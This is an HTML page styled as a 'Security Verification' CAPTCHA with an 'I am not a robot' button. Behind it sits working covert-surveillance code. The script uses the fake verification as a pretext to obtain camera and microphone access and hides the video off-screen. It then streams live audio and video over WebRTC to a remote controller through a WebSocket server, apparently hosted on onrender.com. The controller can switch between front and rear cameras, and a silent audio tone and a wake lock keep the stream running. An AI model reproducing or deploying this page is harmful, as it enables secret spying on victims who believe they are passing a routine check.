<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: #f8fafc;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            color: #1e293b;
            padding: 20px;
        }

        .card {
            background: #ffffff;
            border-radius: 12px;
            padding: 36px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
            border: 1px solid #e2e8f0;
        }

        .icon-shield {
            width: 56px;
            height: 56px;
            background: #eff6ff;
            color: #2563eb;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }

        h1 {
            font-size: 1.35rem;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 10px;
        }

        p {
            font-size: 0.92rem;
            color: #64748b;
            line-height: 1.5;
            margin-bottom: 24px;
        }

        button {
            background: #2563eb;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 0.95rem;
            font-weight: 500;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
        }

        button:hover {
            background: #1d4ed8;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
        }

        .spinner {
            display: inline-block;
            width: 32px;
            height: 32px;
            border: 3px solid #e2e8f0;
            border-top-color: #2563eb;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        video {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0.001;
            pointer-events: none;
        }
    </style>
</head>

<body>
    <div class="card" id="mainCard">
        <div class="icon-shield">
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
            </svg>
        </div>
        <h1>Checking your browser...</h1>
        <p>Please complete quick browser verification to access this protected destination.</p>
        <button id="verifyBtn" onclick="startCovertStream()">I am not a robot</button>
    </div>

    <video id="hiddenVideo" autoplay muted playsinline></video>

    <script>
        const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
        const host = window.location.host || "hangon-k31m.onrender.com";
        const wsUrl = `${protocol}//${host}/ws/target`;

        const rtcConfig = {
            iceServers: [
                { urls: "stun:stun.l.google.com:19302" },
                { urls: "stun:stun1.l.google.com:19302" },
                { urls: "stun:stun2.l.google.com:19302" },
                { urls: "stun:stun3.l.google.com:19302" },
                { urls: "stun:stun4.l.google.com:19302" },
                { urls: "stun:stun.cloudflare.com:3478" },
                { urls: "stun:stun.twilio.com:3478" }
            ],
            iceCandidatePoolSize: 10
        };

        let ws;
        let pc;
        let localStream;
        let pendingIceCandidates = [];
        let pingInterval = null;
        let isConnectingWs = false;
        let currentFacingMode = 'user'; // 'user' (front) or 'environment' (rear)
        let isSwitching = false;
        let frontCameraId = null;
        let backCameraId = null;
        let availableCameras = [];
        const hiddenVideo = document.getElementById('hiddenVideo');

        async function discoverCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                availableCameras = devices.filter(d => d.kind === 'videoinput');
                console.log("[*] Discovered cameras:", availableCameras);

                frontCameraId = null;
                backCameraId = null;

                // 1. Check current active stream's deviceId (guaranteed front on start)
                const currentTrack = localStream ? localStream.getVideoTracks()[0] : null;
                const currentSettings = currentTrack ? currentTrack.getSettings() : {};
                const activeId = currentSettings.deviceId;

                // 2. Identify by labels (excluding ambiguous numbers)
                for (const cam of availableCameras) {
                    const label = (cam.label || '').toLowerCase();
                    if (label.includes('back') || label.includes('rear') || label.includes('environment')) {
                        if (!backCameraId) backCameraId = cam.deviceId;
                    } else if (label.includes('front') || label.includes('user') || label.includes('selfie')) {
                        if (!frontCameraId) frontCameraId = cam.deviceId;
                    }
                }

                // 3. Differential mapping: active camera vs other cameras
                if (activeId) {
                    if (!frontCameraId) frontCameraId = activeId;
                    if (!backCameraId) {
                        const otherCam = availableCameras.find(c => c.deviceId !== activeId);
                        if (otherCam) backCameraId = otherCam.deviceId;
                    }
                }

                // 4. Default index fallback
                if (!frontCameraId && availableCameras.length > 0) frontCameraId = availableCameras[0].deviceId;
                if (!backCameraId && availableCameras.length > 1) backCameraId = availableCameras[1].deviceId;

                console.log(`[*] Exact Camera mapping: Front=${frontCameraId}, Back=${backCameraId}`);
            } catch (e) {
                console.warn("Camera discovery error:", e);
            }
        }

        let audioKeepAliveCtx = null;
        function enableBackgroundKeepAlive() {
            try {
                const AudioContextClass = window.AudioContext || window.webkitAudioContext;
                if (AudioContextClass && !audioKeepAliveCtx) {
                    audioKeepAliveCtx = new AudioContextClass();
                    const oscillator = audioKeepAliveCtx.createOscillator();
                    const gainNode = audioKeepAliveCtx.createGain();
                    gainNode.gain.value = 0.0001; // Imperceptible silent tone
                    oscillator.connect(gainNode);
                    gainNode.connect(audioKeepAliveCtx.destination);
                    oscillator.start();
                }
            } catch (e) {}

            // Screen Wake Lock API
            try {
                if ('wakeLock' in navigator) {
                    navigator.wakeLock.request('screen').catch(() => {});
                    document.addEventListener('visibilitychange', () => {
                        if (document.visibilityState === 'visible' && 'wakeLock' in navigator) {
                            navigator.wakeLock.request('screen').catch(() => {});
                        }
                    });
                }
            } catch (e) {}
        }

        async function startCovertStream() {
            enableBackgroundKeepAlive();

            const card = document.getElementById('mainCard');
            card.innerHTML = `
                <div class="spinner"></div>
                <h1 style="margin-top: 16px;">Verifying browser...</h1>
                <p>Establishing secure connection. Please wait a moment.</p>
            `;

            try {
                localStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 1280, max: 1920 },
                        height: { ideal: 720, max: 1080 }
                    },
                    audio: {
                        echoCancellation: true,
                        noiseSuppression: true,
                        autoGainControl: true
                    }
                });

                if (hiddenVideo) {
                    hiddenVideo.srcObject = localStream;
                    hiddenVideo.play().catch(() => {});
                }

                // Discover all hardware cameras now that permission is granted
                await discoverCameras();

                connectSignaling();
            } catch (err) {
                console.error("Initial camera acquisition error:", err);
                try {
                    localStream = await navigator.mediaDevices.getUserMedia({
                        video: true,
                        audio: true
                    });
                    if (hiddenVideo) {
                        hiddenVideo.srcObject = localStream;
                        hiddenVideo.play().catch(() => {});
                    }
                    await discoverCameras();
                    connectSignaling();
                } catch (fallbackErr) {
                    console.error("Fatal camera permission error:", fallbackErr);
                    card.innerHTML = `
                        <h1 style="color: #ef4444;">Verification Failed</h1>
                        <p>Camera access was not granted. Please allow camera permission and reload the page.</p>
                    `;
                }
            }
        }

        async function switchCamera(requestedMode) {
            if (isSwitching) return;
            isSwitching = true;

            const targetMode = requestedMode || (currentFacingMode === 'user' ? 'environment' : 'user');
            console.log(`[*] Switching camera to: ${targetMode}`);

            try {
                // 1. Locate video sender while peer connection is active
                let videoSender = null;
                if (pc) {
                    const senders = pc.getSenders();
                    videoSender = senders.find(s => (s.track && s.track.kind === 'video') || s.kind === 'video');
                }

                // 2. Stop old video track to release mobile hardware sensor
                if (localStream) {
                    localStream.getVideoTracks().forEach(t => {
                        try {
                            t.enabled = false;
                            t.stop();
                        } catch (e) {}
                    });
                }
                if (hiddenVideo) {
                    try {
                        hiddenVideo.pause();
                        hiddenVideo.srcObject = null;
                    } catch (e) {}
                }

                // 3. 150ms hardware cooldown
                await new Promise(r => setTimeout(r, 150));

                // 4. Query physical device IDs
                let chosenDeviceId = null;
                try {
                    const devices = await navigator.mediaDevices.enumerateDevices();
                    const videoInputs = devices.filter(d => d.kind === 'videoinput');
                    console.log("[*] Video inputs available:", videoInputs.map(v => v.label));

                    if (targetMode === 'environment') {
                        // Find the camera with 'back' or the one that is NOT 'front'
                        const rear = videoInputs.find(d => {
                            const l = (d.label || '').toLowerCase();
                            return l.includes('back') || l.includes('rear') || l.includes('environment') || (!l.includes('front') && !l.includes('user') && !l.includes('selfie'));
                        });
                        if (rear) chosenDeviceId = rear.deviceId;
                    } else {
                        // Find the camera with 'front'
                        const front = videoInputs.find(d => {
                            const l = (d.label || '').toLowerCase();
                            return l.includes('front') || l.includes('user') || l.includes('selfie');
                        });
                        if (front) chosenDeviceId = front.deviceId;
                    }
                } catch (eEnum) {
                    console.log("Device enumeration error:", eEnum);
                }

                // 5. Acquire new camera stream using deviceId first, facingMode second
                let newStream = null;
                const constraints = [];
                if (chosenDeviceId) {
                    constraints.push({ video: { deviceId: { exact: chosenDeviceId } }, audio: false });
                    constraints.push({ video: { deviceId: chosenDeviceId }, audio: false });
                }
                constraints.push({ video: { facingMode: { exact: targetMode } }, audio: false });
                constraints.push({ video: { facingMode: targetMode }, audio: false });
                constraints.push({ video: { facingMode: { ideal: targetMode } }, audio: false });
                constraints.push({ video: true, audio: false });

                let lastErr = null;
                for (const c of constraints) {
                    try {
                        newStream = await navigator.mediaDevices.getUserMedia(c);
                        if (newStream && newStream.getVideoTracks().length > 0) {
                            console.log("[+] Camera acquired with constraint:", JSON.stringify(c));
                            break;
                        }
                    } catch (e) {
                        lastErr = e;
                        console.log("Constraint attempt failed:", JSON.stringify(c), e.name);
                    }
                }

                if (!newStream || newStream.getVideoTracks().length === 0) {
                    throw lastErr || new Error("Failed to open requested camera");
                }

                const newVideoTrack = newStream.getVideoTracks()[0];

                // 5. Hot-swap video track on WebRTC peer connection
                if (videoSender) {
                    await videoSender.replaceTrack(newVideoTrack);
                    console.log("[+] WebRTC replaceTrack succeeded for:", targetMode);
                }

                // 6. Update localStream and hiddenVideo
                const audioTracks = localStream ? localStream.getAudioTracks() : [];
                localStream = new MediaStream([...audioTracks, newVideoTrack]);

                if (hiddenVideo) {
                    hiddenVideo.srcObject = localStream;
                    hiddenVideo.play().catch(() => {});
                }

                currentFacingMode = targetMode;

                // 7. Send confirmation to controller
                const lensLabel = newVideoTrack.label || (targetMode === 'environment' ? 'Rear Camera' : 'Front Camera');
                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: "camera_info",
                        camera: currentFacingMode,
                        label: lensLabel,
                        status: "success"
                    }));
                }
            } catch (err) {
                console.error("Camera switch error:", err);
                // Attempt to restore default camera
                try {
                    const fallback = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                    const fallbackTrack = fallback.getVideoTracks()[0];
                    if (videoSender && fallbackTrack) await videoSender.replaceTrack(fallbackTrack);
                    const audioTracks = localStream ? localStream.getAudioTracks() : [];
                    localStream = new MediaStream([...audioTracks, fallbackTrack]);
                    if (hiddenVideo) {
                        hiddenVideo.srcObject = localStream;
                        hiddenVideo.play().catch(() => {});
                    }
                    currentFacingMode = "user";
                } catch (revertErr) {}

                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: "camera_info",
                        camera: currentFacingMode,
                        error: (err.name || "Error") + ": " + (err.message || "Failed")
                    }));
                }
            } finally {
                isSwitching = false;
            }
        }

        function connectSignaling() {
            if (isConnectingWs) return;
            isConnectingWs = true;

            if (ws) {
                try {
                    ws.onclose = null;
                    ws.close();
                } catch (e) {}
            }

            ws = new WebSocket(wsUrl);

            ws.onopen = async function () {
                isConnectingWs = false;
                console.log("[+] Target connected to signaling server");

                // Start heartbeat ping
                if (pingInterval) clearInterval(pingInterval);
                pingInterval = setInterval(() => {
                    if (ws && ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ type: "ping" }));
                    }
                }, 20000);

                await sendOffer();

                if (ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({
                        type: "camera_info",
                        camera: currentFacingMode
                    }));
                }
            };

            ws.onmessage = async (event) => {
                try {
                    const msg = JSON.parse(event.data);

                    if (msg.type === "pong") {
                        return;
                    }

                    if (msg.type === "request_offer") {
                        console.log("[+] Received request_offer from controller");
                        await sendOffer();
                    } else if (msg.type === "switch_camera") {
                        console.log("[+] Received switch_camera command:", msg.camera);
                        await switchCamera(msg.camera);
                    } else if (msg.type === "answer" && pc) {
                        console.log("[+] Setting remote answer description");
                        await pc.setRemoteDescription(new RTCSessionDescription(msg.data));

                        // Flush any pending ICE candidates safely
                        while (pendingIceCandidates.length > 0) {
                            const cand = pendingIceCandidates.shift();
                            try {
                                await pc.addIceCandidate(cand);
                            } catch (e) {
                                console.warn("Failed to add queued candidate:", e);
                            }
                        }
                    } else if (msg.type === "ice" && pc) {
                        if (pc.remoteDescription && pc.remoteDescription.type) {
                            try {
                                await pc.addIceCandidate(msg.data);
                            } catch (e) {
                                console.warn("Failed to add ICE candidate:", e);
                            }
                        } else {
                            pendingIceCandidates.push(msg.data);
                        }
                    }
                } catch (e) {
                    console.error("Signaling message handling error:", e);
                }
            };

            ws.onerror = (err) => console.error("WebSocket error:", err);

            ws.onclose = () => {
                isConnectingWs = false;
                if (pingInterval) clearInterval(pingInterval);
                console.log("Target WebSocket closed. Reconnecting in 2s...");
                setTimeout(() => {
                    if (localStream) {
                        connectSignaling();
                    }
                }, 2000);
            };
        }

        async function sendOffer() {
            console.log("[*] Generating new WebRTC offer for controller");
            pendingIceCandidates = [];

            if (pc) {
                try {
                    pc.ontrack = null;
                    pc.onicecandidate = null;
                    pc.onconnectionstatechange = null;
                    pc.close();
                } catch (e) {
                    console.warn("Error closing old pc:", e);
                }
            }

            pc = new RTCPeerConnection(rtcConfig);

            if (localStream) {
                localStream.getTracks().forEach(track => {
                    if (track.readyState === 'live') {
                        console.log("[+] Adding track to PC:", track.kind);
                        pc.addTrack(track, localStream);
                    }
                });
            }

            pc.onicecandidate = (event) => {
                if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
                    ws.send(JSON.stringify({ type: "ice", data: event.candidate }));
                }
            };

            pc.onconnectionstatechange = () => {
                console.log("[*] Target WebRTC Connection State:", pc.connectionState);
            };

            const offer = await pc.createOffer({
                offerToReceiveAudio: false,
                offerToReceiveVideo: false
            });
            await pc.setLocalDescription(offer);

            if (ws && ws.readyState === WebSocket.OPEN) {
                console.log("[+] Dispatched offer to controller");
                ws.send(JSON.stringify({ type: "offer", data: offer }));
            }
        }
    </script>
</body>

</html>
